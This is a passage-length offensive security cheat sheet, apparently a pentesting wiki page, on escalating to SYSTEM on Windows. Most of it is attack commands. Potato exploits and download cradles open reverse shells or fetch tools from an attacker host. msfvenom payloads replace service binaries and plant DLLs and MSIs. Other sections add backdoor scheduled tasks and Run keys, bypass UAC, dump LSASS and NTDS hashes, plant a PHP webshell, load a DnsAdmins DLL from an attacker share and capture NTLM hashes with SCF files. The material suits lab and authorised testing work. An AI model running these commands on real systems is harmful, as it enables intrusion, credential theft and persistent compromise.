# Windows Privilege Escalation

Turning a low-priv Windows shell into SYSTEM. Token privileges decide most boxes before you've even looked at services — run the first-30-seconds checklist before anything else, then match what you find against the vectors below.

{% hint style="warning" %}
`whoami /priv` is the single highest-signal command on any Windows box. Token privileges (`SeImpersonate`, `SeAssignPrimaryToken`, `SeBackup`, `SeRestore`, `SeDebug`, `SeTakeOwnership`, `SeLoadDriver`, `SeManageVolume`) each map to a well-known, near-instant escalation. Check it before running any automated enumeration script.
{% endhint %}

## Fast Enumeration Checklist

```cmd
:: First 30 seconds — always in this order
whoami /priv                                                  :: token privileges — rank #1 signal
whoami /all                                                   :: groups + SIDs — rank #2 signal
systeminfo                                                    :: OS build, patches — feed to WES-NG
wmic qfe list                                                 :: installed patches
net user %USERNAME%                                           :: groups + password-set-date
```

```cmd
:: PATH is stripped in service / H2 / JNI / some xp_cmdshell contexts — restore before diagnosing anything
set PATH=%SystemRoot%\system32;%SystemRoot%;
:: fallback: call binaries by full path, e.g. c:\windows\system32\whoami.exe
```

```powershell
:: Local enumeration keystones
tasklist /v                                                    :: process owners — SYSTEM services
sc query                                                       :: service list
sc qc <SERVICE>                                                :: binary path + start account
schtasks /query /fo LIST /v                                    :: scheduled tasks
Get-ChildItem "C:\Program Files (x86)" -Directory              :: non-standard 3rd-party apps = usually the win
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
```

{% hint style="info" %}
**Config-level primitives before kernel exploits.** Credentials, token privileges, and service misconfigurations solve the overwhelming majority of Windows boxes. Kernel LPEs risk crashing the target — treat them as the last resort, not the first move.
{% endhint %}

### Enumeration Tools

```powershell
.\winpeas.exe
.\winpeas.exe > output.txt
.\winpeas.exe -systeminfo

# PowerUp.ps1
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1'); Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all -full
.\Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
.\Seatbelt.exe -group=remote -computername=dc.<TARGET>.local -username=<TARGET>\sam -password="password"

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"

# JAWS
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

| Tool | Purpose |
| --- | --- |
| winPEAS | General-purpose enumeration, colour-coded findings |
| PowerUp.ps1 | Scripted service/registry/token privesc checks with one-shot exploit helpers |
| Seatbelt | .NET situational-awareness collector |
| PrivescCheck | PowerShell enumeration, extended reporting |
| JAWS | Lightweight PowerShell enumeration |
| Watson / Sherlock | Kernel exploit / patch-level suggesters |
| Windows-Exploit-Suggester / WES-NG | `systeminfo` → matching CVEs against the MSRC database |
| BeRoot | Cross-checks common privesc misconfigurations |

### WES-NG — Automated CVE Matching from `systeminfo`

```bash
# Kali side — install + update DB
git clone https://github.com/bitsadmin/wesng.git && cd wesng
python3 wes.py --update

# Target side
systeminfo > systeminfo.txt          # copy back to Kali

# Kali side — match
python3 wes.py systeminfo.txt
python3 wes.py systeminfo.txt --impact "Elevation of Privilege" -e     # exploitable EoP only
python3 wes.py systeminfo.txt --hide "KB5001330"                       # assume a KB is installed
```

`--update` refreshes the CVE DB; `--impact "<type>"` filters by category; `-e` hides info-disclosure-only hits; `-o <file>` writes CSV. Run this right after `systeminfo`, before committing time to a manual CVE hunt — it covers the full MSRC dataset, not just winPEAS's built-in list.

## Frequency-Ranked Escalation Vectors

| Rank | Vector | Notes |
| --- | --- | --- |
| 1 | Token privileges — `SeImpersonate` → Potato variants | Service accounts (IIS, MSSQL, custom apps) most often carry this |
| 2 | `SeManageVolumePrivilege` → grant Users FULL on `C:\Windows` → DLL drop | Requires `SeManageVolumeAbuse` |
| 3 | Weak service binary permissions | User-writable service exe → replace + restart |
| 4 | Unquoted service paths | Path split at spaces → payload in an earlier segment |
| 5 | `AlwaysInstallElevated` (both HKLM+HKCU = 1) | MSI installs as SYSTEM |
| 6 | Weak service configuration (`sc config` writable) | Needs `SVC_CHANGE_CONFIG` or `SeChangeNotify` |
| 7 | Registry AutoRun / RunOnce writable | Payload fires at next logon |
| 8 | AutoLogon creds in Winlogon registry key | Cleartext admin password |
| 9 | Reversibly-encrypted application credentials | Product-specific decoder (VNC, DVR/NVR software) |
| 10 | DPAPI-protected credentials | `SharpDPAPI` / `mimikatz::dpapi` |
| 11 | PowerShell history / transcripts | `ConsoleHost_history.txt`, `Start-Transcript` output |
| 12 | Credential Manager saved creds | `cmdkey /list` + `runas /savecred` |
| 13 | FileZilla saved sessions | Base64 password in `recentservers.xml` |
| 14 | `Backup Operators` membership | `reg save` hives → offline crack |
| 15 | Kernel exploits | LAST RESORT — risk of crashing the box |

## Token Privilege Escalation (Potatoes)

```powershell
whoami /priv
```

| Privilege | Attack | Tool |
| --- | --- | --- |
| `SeImpersonatePrivilege` | Coerce a SYSTEM named-pipe connection, duplicate the token | PrintSpoofer, GodPotato, JuicyPotato, RoguePotato, EfsPotato, SigmaPotato |
| `SeAssignPrimaryTokenPrivilege` | Same class as SeImpersonate | Potato variants |
| `SeManageVolumePrivilege` | Grant Users FULL on `C:\Windows` → drop DLL in print driver dir → COM trigger | SeManageVolumeAbuse + PrintConfig.dll + PrintNotify COM |
| `SeBackupPrivilege` | Read any file regardless of ACL (SAM/SYSTEM/SECURITY hives) | `reg save`, `robocopy /b`, `secretsdump.py LOCAL` |
| `SeRestorePrivilege` | Write any file, including protected system binaries | Combine with SeBackup |
| `SeTakeOwnershipPrivilege` | Take ownership of any object, grant self access | `takeown /F <target>` |
| `SeLoadDriverPrivilege` | Load an arbitrary signed vulnerable driver | Capcom.sys + EoPLoadDriver/ExploitCapcom |
| `SeDebugPrivilege` | Inject into SYSTEM processes, dump/duplicate tokens | mimikatz `privilege::debug` + `sekurlsa::pth` |
| `SeShutdownPrivilege` | Reboot only — pairs with a writable service exe | `shutdown /r /t 0` |
| `SeEnableDelegationPrivilege` | Configure Kerberos delegation on computer/user accounts | PowerView `Set-DomainObject` + Rubeus monitor |

### PrintSpoofer (SeImpersonate — Server 2016-2019, older Win10)

```cmd
:: -i (interactive) elevates the CURRENT console — preferred when you already have a shell
C:\Temp\PrintSpoofer64.exe -i -c cmd.exe

:: -c (classic) mangles quoted args — fine for simple commands
C:\Temp\PrintSpoofer64.exe -c "C:\Temp\nc.exe <ATTACKER_IP> 443 -e cmd.exe"
```

### GodPotato (SeImpersonate — Server 2019/Win11 where PrintNightmare surface is patched)

```cmd
:: Does NOT upgrade the current shell — spawns a new SYSTEM process, runs -cmd, exits
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt"

:: Full SYSTEM shell — upload nc.exe first
C:\Windows\Temp\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <ATTACKER_IP> 443 -e cmd.exe"
```

Requires .NET 4.7.2+; use the `-NET2` variant on older systems.

### SigmaPotato (modern successor for Server 2019+ / Windows 11)

```powershell
whoami /priv | findstr /i impersonate

.\SigmaPotato.exe "net user pwn Lab123! /add"
.\SigmaPotato.exe "net localgroup administrators pwn /add"
.\SigmaPotato.exe "powershell -enc <BASE64-of-download-cradle>"
```

Successor to RoguePotato + PrintSpoofer + GodPotato for builds where the older potatoes hit patched code paths.

### JuicyPotato (Server 2008-era, needs an OS-specific CLSID)

```cmd
certutil -urlcache -f http://<ATTACKER_IP>/JuicyPotato.x86.exe jpx86.exe

jpx86.exe -t * -l 1337 ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c C:\Temp\nc.exe -e cmd.exe <ATTACKER_IP> 443" ^
  -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
:: -t *   try both CreateProcessWithTokenW and CreateProcessAsUserW
:: -l     COM listening port (any high port)
:: -c     OS-specific CLSID (mandatory on 2008) — full lists at ohpe/juicy-potato on GitHub
```

### RoguePotato (Server 2019+ where SeImpersonate potatoes are patched)

```cmd
# Attacker
socat tcp-listen:135,reuseaddr,fork tcp:<ATTACKER_IP>:9999

# Target
RoguePotato.exe -r <ATTACKER_IP> -e "C:\windows\system32\cmd.exe" -l 9999
```

### EFSPotato (MS-EFSR alternative)

```cmd
csc EfsPotato.cs
csc /platform:x86 EfsPotato.cs
.\EfsPotato.exe
```

### Token Impersonation with Incognito / Mimikatz

```
# Metasploit incognito
getuid
list_tokens -u
impersonate_token "<DOMAIN>\Administrator"

# Mimikatz
mimikatz # token::list
mimikatz # token::impersonate /id:500
```

### FullPowers — Restore a Restricted Service-Account Token

If you land as a restricted service account (`IUSR`, `NT SERVICE\...`) with most privileges stripped, `FullPowers` re-enables the full token set via a task-scheduler trick, then chain a Potato from the restored shell:

```cmd
.\FullPowers.exe
:: spawns a new cmd with normal service privileges restored — run GodPotato/PrintSpoofer from here
```

### SeBackup / SeRestore

```powershell
robocopy /b C:\Windows\System32\config C:\Temp config
# Extracts SAM, SYSTEM, SECURITY hives

reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\sys.bak
reg save HKLM\SECURITY C:\Temp\sec.bak
# Exfil, then on attacker:
secretsdump.py -sam sam.bak -system sys.bak -security sec.bak LOCAL
```

Enable-SeRestorePrivilege + replacing a system binary (e.g. `utilman.exe` with `cmd.exe`) is the write-primitive equivalent.

### SeTakeOwnership

```cmd
takeown.exe /f "%windir%\system32"
icacls.exe "%windir%\system32" /grant "%username%":F
```

## Service Misconfigurations

### Find Vulnerable Services

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
Get-WmiObject Win32_Service | Select Name, State, PathName, StartName
```

### Weak Service Permissions

```powershell
icacls "C:\Program Files\Vulnerable\app.exe"
```

| Letter | Meaning | Actionable? |
| --- | --- | --- |
| `F` | Full control | YES — you own it |
| `M` | Modify (read/write/execute/delete) | YES — good enough for binary replace |
| `W` | Write | YES — overwrite the file's contents |
| `D` | Delete | Combine with `W` for full replace |
| `WDAC` | Write DAC (change permissions) | YES — grant yourself full control |
| `WO` | Write Owner | YES — takeown then re-permission |
| `RX` / `R` | Read (+execute) | No |
| `(OI)` / `(CI)` | Object/Container inherit | Combine with directory checks |
| `(I)` | Inherited from parent | Historical context only |

Anything of the form `BUILTIN\Users:(F/M/W)`, `Authenticated Users:(F/M/W)`, `Everyone:(F/M/W)`, or `NT AUTHORITY\INTERACTIVE:(F/M/W)` on a service binary = privesc.

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks                        # runs every bundled privesc check
Get-ModifiableService                   # services whose CONFIG we can change
Get-ModifiableServiceFile               # services whose BINARY we can overwrite
Get-UnquotedService                     # unquoted service paths
Install-ServiceBinary -Name 'VulnSvc'   # one-shot adduser payload over the binary
Restore-ServiceBinary -Name 'VulnSvc'   # restore backup after cleanup
```

```c
// adduser.c — tiny binary that runs as SYSTEM when the swapped service starts
#include <stdlib.h>
int main () {
    system("net user pwn lab /add");
    system("net localgroup administrators pwn /add");
    return 0;
}
```

```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

{% hint style="info" %}
**Restart fallback when `net stop` is denied.** Users lacking `SERVICE_STOP` but with binary write can still trigger the swap by rebooting: `shutdown /r /t 0` (needs `SeShutdownPrivilege` — default for Users on client OSes). If shutdown is also denied but you have another logged-in session, `logoff <session-id>` forces re-login of that session.
{% endhint %}

### Replace Service Binary

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe-service -o malicious.exe
copy "C:\Program Files\Vulnerable\app.exe" "C:\Program Files\Vulnerable\app.exe.bak"
copy malicious.exe "C:\Program Files\Vulnerable\app.exe" /Y
net stop VulnerableService
net start VulnerableService
```

`-f exe-service` is mandatory for a binary the SCM starts directly — a plain `-f exe` payload dies to the service-control-handshake timeout in ~30 seconds.

**Locked binary (service running, `sc stop` denied):** Windows allows *renaming* a locked file even when it can't be overwritten directly.

```cmd
cd "C:\Program Files\Vulnerable"
rename app.exe app.exe.orig
copy C:\Temp\malicious.exe app.exe
shutdown /r /t 0
```

### Modify Service Configuration

```powershell
sc qc VulnerableService
sc config VulnerableService binPath= "C:\Temp\malicious.exe"
sc config VulnerableService start= auto
net stop VulnerableService
net start VulnerableService
```

## Unquoted Service Paths

If a service path is unquoted and contains spaces, Windows tries to execute each earlier segment as its own binary.

```
C:\Program Files\Vulnerable App\service.exe
```

Windows tries, in order: `C:\Program.exe` → `C:\Program Files.exe` → `C:\Program Files\Vulnerable.exe` → the real path.

```powershell
# Find candidates
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""

# Check permissions on parent directories, then drop the payload at the earliest writable segment
icacls "C:\Program Files\"
```

## DLL Hijacking

### Procmon Workflow to Confirm a Hijack Target

```
1. Download Procmon64.exe from Sysinternals Live
2. Run as Administrator on the target
3. Filter (Ctrl+L): Process Name is <app>.exe, Path contains .dll, Operation is CreateFile — all Include
4. Launch the target app; watch the Path column for NAME NOT FOUND on .dll paths
5. Cross-check writability: icacls "<folder>"
```

### DLL Search Order (SafeDllSearchMode = 1, the default)

1. Directory the application was loaded from
2. `C:\Windows\System32`
3. `C:\Windows\System` (16-bit legacy)
4. `C:\Windows`
5. Current working directory (this is why CWD attacks work)
6. Every directory in `PATH`, in order

With `SafeDllSearchMode=0`, CWD moves to position 2 — much more permissive.

```powershell
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Session Manager' | Select SafeDllSearchMode
```

### Compile and Plant

```c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

```bash
i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll     # 32-bit
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll    # 64-bit
```

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f dll -o malicious.dll
copy malicious.dll "C:\Search\Path\vulnerable.dll"
```

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# Modify an existing task
SCHTASKS /Change /tn "\Task\Name" /TR "C:\windows\system32\cmd.exe /c C:\temp\shell.exe" /RL HIGHEST /RU "" /ENABLE

# Or create a new one
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
```

```powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -AtLogOn -User "Administrator"
$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P
Register-ScheduledTask "Backdoor" -InputObject $D
```

## Registry Autoruns & UAC Bypass

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Winlogon helper — runs at every logon
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, C:\Windows\Temp\backdoor.exe" /f
```

```powershell
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

| Technique | Mechanism |
| --- | --- |
| Hijack Windows Update | Modify Update Orchestrator Service path |
| DLL Hijacking | MSIExec, DiagHub, and other auto-elevated binaries |
| Registry modification | Winlogon, Image File Execution Options |
| Sticky Keys / Ease of Access | Replace `sethc.exe` or `utilman.exe` |
| CMSTP.exe | Scriptable COM interface |
| Eventvwr.exe | Registry hijack + scheduled task |

```powershell
# fodhelper.exe bypass (Windows 10)
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\System32\cmd.exe" /f
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
fodhelper.exe
```

```bash
# UACMe — collection of auto-elevate abuse methods
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > backdoor.exe
upload backdoor.exe
upload Akagi64.exe
./Akagi64.exe 23 C:\Temp\backdoor.exe          # method 23 is a common default
```

## AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`, the system installs any MSI as SYSTEM.

```powershell
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f msi -o shell.msi
msiexec /quiet /qn /i C:\evil.msi
```

## Privileged Group Abuse

```powershell
whoami /groups
```

| Group | Privilege gained | Attack |
| --- | --- | --- |
| **Backup Operators** | `SeBackup`/`SeRestore` | Read/write any file — `reg save` hives, offline crack, or `diskshadow` + `Copy-FileSeBackupPrivilege` to pull `NTDS.dit` |
| **Server Operators** | Start/stop services, modify configs | `sc config <svc> binPath= "cmd /c net localgroup Administrators <USER> /add"` then `sc start <svc>` |
| **Print Operators** | `SeLoadDriverPrivilege` | Load a vulnerable signed driver (e.g. Capcom.sys) for kernel code exec |
| **DnsAdmins** | Load arbitrary DLL into DNS service (runs as SYSTEM) | `dnscmd <DC> /config /serverlevelplugindll \\<ATTACKER_IP>\share\adduser.dll` then restart the DNS service |
| **Event Log Readers** | Read Security event logs | `wevtutil qe Security /rd:true /f:text | findstr "/user"` — process-creation events leak cleartext creds |
| **Hyper-V Administrators** | Access/clone VM disks | Mount the DC's VHDX offline, extract `NTDS.dit` + `SYSTEM` |
| **Remote Desktop Users** | RDP logon | Combine with an elevated file-dialog LPE |

```powershell
# Backup Operators — extract NTDS.dit via diskshadow
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\flag.txt' .\flag.txt

# diskshadow.txt: set context persistent nowriters / add volume c: alias rdj1 / create / expose %rdj1% z:
diskshadow /s diskshadow.txt
Copy-FileSeBackupPrivilege 'Z:\Windows\NTDS\ntds.dit' .\ntds.dit
reg save HKLM\SYSTEM .\SYSTEM
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

```powershell
# DnsAdmins — malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o shell.dll
dnscmd <DC_HOSTNAME> /config /serverlevelplugindll \\<ATTACKER_IP>\share\shell.dll
sc stop dns && sc start dns
# Cleanup:
dnscmd <DC_HOSTNAME> /config /serverlevelplugindll ""
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
```

## Credential Hunting

```powershell
# PowerShell history + transcripts (a distinct, richer source — captures full sessions)
Get-Content (Get-PSReadLineOption).HistorySavePath
Get-ChildItem -Recurse -Force -Include *transcript*.txt,PowerShell_transcript.* C:\ 2>$null
findstr /si "ConvertTo-SecureString password Enter-PSSession" C:\*.txt

# Saved credentials
cmdkey /list
runas /savecred /user:domain\admin "cmd.exe"

# Registry / AutoLogon / PuTTY
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattend / sysprep files
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
echo "<BASE64>" | certutil -decode - decoded.txt

# Wifi
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# Browser / LaZagne
.\SharpChrome.exe logins /unprotect
python3 firefox_decrypt.py
.\lazagne.exe all

# LSASS dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp

# PSCredential export
$cred = Import-Clixml -Path 'C:\scripts\pass.xml'
$cred.GetNetworkCredential().password       # only decrypts in the ORIGINAL user's context (DPAPI-bound)
```

**Stored application credentials (FileZilla / VNC / mRemoteNG)** — desktop apps store reusable passwords in plaintext or trivially-encoded configs:

```powershell
type "%APPDATA%\FileZilla\recentservers.xml"
type "%APPDATA%\FileZilla\sitemanager.xml"
```

```bash
echo 'Q29udHJvbEZyZWFrMTE=' | base64 -d       # decode the <Pass encoding="base64"> value
```

```powershell
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
reg query "HKCU\Software\ORL\WinVNC3\Password"
type C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml
```

```bash
# mRemoteNG — default master password is mR3m
python3 mremoteng_decrypt.py -s "<PASSWORD_VALUE>"
python3 mremoteng_decrypt.py -s "<PASSWORD_VALUE>" -p <MASTER_PASSWORD>
```

**High-value locations to always check:**

```powershell
Get-ChildItem -Path C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue
type C:\inetpub\wwwroot\web.config
rundll32 keymgr,KRShowKeyMgr
```

## Kernel Exploit Reference

Use as the first look right after `systeminfo`. Cross-reference against searchsploit / a public PoC before committing time.

| CVE | Affected Build | Impact |
| --- | --- | --- |
| CVE-2023-29360 | Win 10/11, Server 2016-2022 | Streaming Service EoP → SYSTEM |
| CVE-2022-21882 | Win 10 v1809-21H2, Server 2019 (pre-Jan 2022) | Win32k EoP → SYSTEM |
| CVE-2021-34527 (PrintNightmare) | Win 7 - Server 2019, before July 2021 patch | Print Spooler RCE → SYSTEM |
| CVE-2021-1732 | Win 10 v1809-20H2 | Win32k EoP → SYSTEM |
| CVE-2020-1054 | Win 7, Server 2008 R2 | Win32k EoP → SYSTEM |
| CVE-2020-0796 (SMBGhost) | Win 10 v1903-1909 (pre-March 2020) | SMBv3 LPE / unauth RCE → SYSTEM |
| MS16-032 | Server 2008-2012 R2, Win 7-10 (pre-March 2016) | Secondary Logon EoP → SYSTEM |
| MS15-051 | Server 2003-2012, Win 7 (pre-May 2015) | Win32k EoP → SYSTEM |
| MS14-058 | Windows 7/8, Server 2008/2012 | TrackPopupMenu EoP → SYSTEM |
| MS11-046 | Windows XP/7, Server 2003/2008 | AFD.sys EoP → SYSTEM |
| MS10-059 (Chimichurri) | Server 2008 (SP0/SP2) | Task Scheduler EoP → SYSTEM |

```bash
# MSF Local Exploit Suggester
use post/multi/recon/local_exploit_suggester
set SESSION <ID>
run
```

## Living Off The Land Binaries (LOLBins)

```powershell
wmic.exe process call create calc
regsvr32 /s /n /u /i:http://<ATTACKER_IP>/file.sct scrobj.dll
csc.exe C:\payload.cs
```

Full technique catalog: the LOLBAS Project (lolbas-project.github.io).

### Alternate Data Streams (ADS)

```cmd
payload.exe > windowslog.txt:winpeas.exe
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```

## Shadow Copies & NTDS Extraction

```powershell
vssadmin list shadows
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
copy c:\shadowcopy\Windows\System32\config\SAM C:\Temp\SAM

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL
```

## Named Pipe Impersonation

Services running as SYSTEM that create named pipes can be impersonated if you connect before the legitimate client.

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\")
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\path\to\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
```

## Application-Specific & Misc Vectors

**PHP webshell via a web server running as SYSTEM:**

```powershell
sc qc Apache2.4 | findstr "START_NAME"
Set-Content -Path C:\xampp\htdocs\cmd.php -Value '<?php system($_GET["cmd"]); ?>' -Encoding ascii
# -Encoding ascii is mandatory — the default UTF-16 BOM breaks PHP parse
```

```bash
curl "http://<TARGET>/cmd.php?cmd=whoami"
```

**LAPS password reading** — if the current account can read `ms-Mcs-AdmPwd`:

```powershell
Import-Module ActiveDirectory
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, 'ms-Mcs-AdmPwd'
evil-winrm -i <TARGET> -u Administrator -p '<PASSWORD>'
```

**WSUS Administrator abuse** — deliver a malicious "update" that executes as SYSTEM on targeted machines when WSUS runs over HTTP or the account is a WSUS admin:

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
.\SharpWSUS.exe create /payload:"C:\Windows\System32\cmd.exe" /args:"/c net localgroup administrators <USER> /add" /title:"Critical Update"
.\SharpWSUS.exe approve /updateid:<UPDATE_ID> /computername:<TARGET> /groupname:"Forced Update Group"
```

**SCF file attack on a writable share** — capture NTLMv2 when users browse the share:

```bash
cat > @attack.scf << 'EOF'
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
responder -I eth0 -wrf
smbclient //<TARGET>/share -U <USER>%<PASS> -c 'put @attack.scf'
# Crack with hashcat -m 5600
```

**GhostScript RCE (CVE-2023-36664)** — pre-10.01.2 allows RCE via crafted EPS/PostScript, triggered wherever a service processes uploaded files through GhostScript (print queues, converters):

```bash
python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e <BASE64_PAYLOAD>" --filename malicious.eps
```

**CVE-2019-1388 — certificate dialog escalation** (pre-Nov 2019, needs GUI access):

```
1. Run hhupd.exe as Administrator → UAC prompt → "Show details"
2. "Show information about the publisher's certificate" → click the "Issued by" link
3. Browser opens as SYSTEM → File → Save As → type C:\Windows\System32\cmd.exe → Enter
```

**Citrix / kiosk breakout** — standard escape methods once inside a restricted desktop: UNC path via File Explorer to an attacker SMB share, uploading a cmd spawner, opening `cmd.exe` through any file-open dialog, or Task Manager → File → Run New Task.

**MSI CustomActions:**

```powershell
.\msidump.exe setup.msi
msiexec /fa {PRODUCT_GUID}       # triggers CustomActions during repair
```

## Related

- [Linux Privilege Escalation](linux-privesc-methodology.md)
- [Password & Hash Attacks](password-hash-attacks.md)
- [Credential Dumping](credential-dumping.md)
- [Lateral Movement](lateral-movement.md)
- [Active Directory Attacks](ad-attacks.md)
- [Shells & Payloads](shells-payloads.md)
- [Report Writing](report-writing.md)
